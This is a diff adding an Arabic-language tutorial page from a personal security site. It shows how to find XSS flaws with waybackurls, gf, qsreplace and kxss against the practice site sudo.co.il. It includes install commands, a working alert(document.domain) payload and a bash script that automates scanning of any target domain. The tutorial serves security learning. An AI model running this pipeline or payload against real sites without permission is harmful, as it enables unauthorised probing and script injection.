@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link href='https://cdn.jsdelivr.net/npm/boxicons@2.0.5/css/boxicons.min.css' rel='stylesheet'>
+        <link rel="stylesheet" href="../../assets/css/styles.css">
+        <link rel="shortcut icon" type="image/png" href="../../assets/img/hacker.png">
+        <title>Find XSS</title>
+    </head>
+    <body>
+
+        <a href="#" class="scrolltop" id="scroll-top">
+            <i class='bx bx-chevron-up scrolltop__icon'></i>
+        </a>
+        
+        <header class="l-header" id="header">
+            <nav class="nav bd-container">
+                <a href="../../index.html" class="nav__logo">Ahmed Hamza</a>
+                <div class="nav__menu" id="nav-menu">
+                    <ul class="nav__list">
+                        <li class="nav__item"><a href="../../index.html" class="nav__link">Home</a></li>
+                        <li class="nav__item"><a href="../../writeups/writeups.html" class="nav__link ">Writeups</a></li>
+                        <li class="nav__item"><a href="../../tutorials/tutorials.html" class="nav__link active-link">Tutorials</a></li>
+                        <li class="nav__item"><a href="../../it-project/it-project.html" class="nav__link">IT-Project</a></li>
+                        <li><i class='bx bx-moon change-theme' id="theme-button"></i></li>
+                    </ul>
+                </div>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class='bx bx-menu'></i>
+                </div>
+            </nav>
+        </header>
+
+        <main class="l-main">
+        <section class="menu section bd-container">
+            <h2 class="section-title">XSS طريقة اكتشاف ثغرة</h2>
+            <div>
+
+<p dir="rtl">
+السلام عليكم , 
+<br>
+شرح طريقة اكتشاف ثغرة XSS باستخدام مجموعة ادوات [waybackurls - gf - qsreplace - kxss] : 
+<br>
+<br>
+شرح الادوات :
+</p>
+<br>
+<p dir="rtl">
+1. تقوم اداة waybackurls بجمع كل العناوين URLs الخاصة بالموقع مع كل المجالات الفرعية : 
+<br>
+
+2. تقوم اداة sort -u بفلترة العناوين المكررة 
+<br>
+3. تقوم اداة gf xss بفلترة العناوين مع الباراميتر التي تقبل المدخلات مثل [https://target.com?name=test]
+<br>
+4. تقوم اداة tee -a باخراج النتائج في ملف
+<br>
+5. تقوم اداة qsreplace باستبدال قيمة الباراميتر بقيمة FUZZ   
+<br>
+6. تقوم اداة kxss بفحص كل الباراميتر واستبدال كلمة FUZZ بمجموعة مدخلات مثل [ "><' ] للتحقق من ثغرة XSS و HTML Injection
+<br>
+7. امر  pipe  (|)  لإعادة توجيه المخرجات والنتائج من برنامج إلى آخر   
+</p>
+
+<br>
+<p dir="rtl">
+تنزيل الادوات باتباع الخطوات التالية بالترتيب :
+<br>
+</p>
+
+<pre class="code">
+ # sudo apt install golang-go  
+ # go get github.com/tomnomnom/waybackurls  
+ # go get -u github.com/tomnomnom/gf  
+ # cd ~/  
+ # git clone https://github.com/1ndianl33t/Gf-Patterns  
+ # mkdir .gf  
+ # mv ~/Gf-Patterns/*.json ~/.gf  
+ # rm -rf ~/Gf-Patterns/  
+ # go get -u github.com/tomnomnom/qsreplace  
+ # go get github.com/Emoe/kxss  
+</pre>
+
+<br>
+<p dir="rtl">
+لتستطيع تشغيل الادوات من الترمنال مباشرة قم بنقل الاداوت الى المسار التالي :
+</p>
+
+<pre class="code">
+ # cd ~/go/bin/  
+ # sudo cp waybackurls gf qsreplace kxss  /usr/bin  
+</pre>
+<br>
+<p dir="rtl">
+الان سنقوم بفحص موقع http://sudo.co.il/xss الخاص بالتدرب على اكتشاف ثغرات XSS :
+</p>
+<br>
+<img src="pic/all-xss.png" width="100%" height="100%" alt="Image Is Not Found ...">
+
+<br>
+<br>
+<br>
+<p dir="rtl">
+استخدام اداة waybackurls مع اسم الموقع فقط بدون https :
+</p>
+<pre class="code">
+ # waybackurls sudo.co.il/xss | sort -u >> waybackdata.txt  
+ # cat waybackdata.txt | gf xss  | tee -a  xss1.txt | qsreplace FUZZ >> xss2.txt  
+ # cat  xss2.txt | kxss |tee  kxss.txt  
+</pre>
+<br>
+<img src="pic/xss.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+<br>
+
+<p dir="rtl"> 
+كل URLs التي تم عرضها لاتقوم بفلترة المدخلات [" < > $ | ( ) ` : ; { }]  :
+</p>
+<br>
+<pre class="code"> http://sudo.co.il:80/xss/level5-1.php?p=FUZZ"><  </pre>
+<br>
+<img src="pic/sudo-xss-1.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+<br>
+<p>Source Code :</p>
+<br>
+<img src="pic/sudo-xss-2.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+<br>
+<p dir="rtl"> 
+البايلود المناسب لتنفيذ سكربت في الموقع المصاب :
+</p>
+<pre class="code"> ';alert(document.domain);'  </pre>
+
+<br>
+<pre class="code"> http://sudo.co.il:80/xss/level5-1.php?p=FUZZ';alert(document.domain);'  </pre>
+<br>
+<img src="pic/sudo-xss-3.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+<br>
+<p>Source Code :</p>
+<br>
+<img src="pic/sudo-xss-4.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+<br>
+<p dir="rtl">
+سنقوم بانشاء سكربت بلغة Bash لأتمتة كل الاوامر السابقة في امر واحد : 
+</p>
+<pre class="code">
+ Bash Script : script.sh
+ ========================
+ #!/bin/bash
+ waybackurls $1 | sort -u >> waybackdata.txt
+ cat waybackdata.txt | gf xss  | tee -a  xss1.txt | qsreplace FUZZ >> xss2.txt
+ cat  xss2.txt | kxss |tee  kxss.txt
+ =========================
+</pre>
+<br>
+<p dir="rtl">
+نقوم باعطاء السكربت صلاحيات التنفيذ 
+</p>
+<pre class="code"> sudo chmod +x script.sh  </pre>
+<br>
+<p dir="rtl">
+تنفيذ السكربت مع اسم الموقع فقط بدون https
+</p>
+
+<pre class="code">
+ Example :
+ ./script.sh target.com
+ ./script.sh sudo.co.il:80/xss 
+</pre>
+<br>
+<img src="pic/script-sh.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+</div>
+</section>
+</main>
+
+<footer class="footer section bd-container">
+
+</footer>
+
+<script src="https://unpkg.com/scrollreveal"></script>
+<script src="../../assets/js/main.js"></script>
+<script src="https://code.iconify.design/2/2.0.3/iconify.min.js"></script>
+
+</body>
+</html>
